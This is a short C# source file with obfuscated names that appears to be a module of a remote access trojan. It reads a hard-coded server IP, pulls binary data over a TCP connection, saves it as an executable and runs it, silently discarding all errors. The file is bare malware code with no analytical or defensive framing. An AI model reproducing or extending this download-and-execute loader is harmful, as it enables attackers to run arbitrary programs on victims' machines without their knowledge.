using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace dtiardhues;

internal class OLRDMR
{
	public MLREDM server;

	public OLRDMR(MLREDM lID)
	{
		server = lID;
	}

	public NetworkStream dtiardhuesNS(TcpClient dtiardhuestcpsck)
	{
		return dtiardhuestcpsck.GetStream();
	}

	public string dtiardhuesserverIPD()
	{
		return Encoding.UTF8.GetString(DLAONIF.dtiardhuesvpsips, 0, DLAONIF.dtiardhuesvpsips.Length);
	}

	public void dtiardhuesdo_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void dtiardhuesremove_user()
	{
		try
		{
			byte[] array = server.dtiardhuespull_data();
			if (array != null && !File.Exists(DLAONIF.dtiardhuesget_mpath() + DLAONIF.dtiardhuesremvUser + ".exe"))
			{
				File.WriteAllBytes(DLAONIF.dtiardhuesget_mpath() + DLAONIF.dtiardhuesremvUser + ".exe", array);
				dtiardhuesdo_process(DLAONIF.dtiardhuesget_mpath() + DLAONIF.dtiardhuesremvUser + ".exe");
			}
		}
		catch
		{
		}
	}
}
